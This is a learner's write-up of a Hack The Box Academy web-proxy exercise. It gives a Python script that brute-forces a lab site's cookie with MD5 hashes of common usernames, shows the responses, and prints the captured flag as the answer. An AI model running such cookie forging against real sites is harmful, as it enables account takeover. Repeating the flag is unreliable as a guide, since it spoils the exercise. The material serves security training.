# Section 11: Zap Fuzzer

Module: 14. Using Web Proxies

---

## Questions & Answers

### 1. The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.

Context:
- I don't have ZAP so I have a Python script instead:
```python
import hashlib
import requests

url = "http://154.57.164.82:30973/skills/"
wordlist_path = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        username = line.strip()
        if not username:
            continue
        
        md5_hash = hashlib.md5(username.encode("utf-8")).hexdigest()
        
        cookies = {
            "cookie": md5_hash
        }
        
        print(f"Testing username: {username} | Hash: {md5_hash}")
        response = requests.get(url, cookies=cookies)
        
        print(response.text)
```
Got:
```
<SNIP>
Testing username: mysql | Hash: 81c3b080dad537de7e10e0987a4bf52e

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Welcome</title>

</head>

<body style="background-color: #141d2b; font-family: sans-serif; color: white;">
    <center>
                    </center>
</body>

</html>
Testing username: user | Hash: ee11cbb19052e40b07aac0ca060c23ee

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Welcome</title>

</head>

<body style="background-color: #141d2b; font-family: sans-serif; color: white;">
    <center>
                    <div class='control'>
                <h1>
                    Welcome Back user
                </h1>
            </div>
            <br><br>
            HTB{fuzz1n6_my_f1r57_c00k13}
                    </center>
</body>

</html>
<SNIP>

```

**Answer:** `HTB{fuzz1n6_my_f1r57_c00k13}`

---

[Back to Module Index](./README.md)
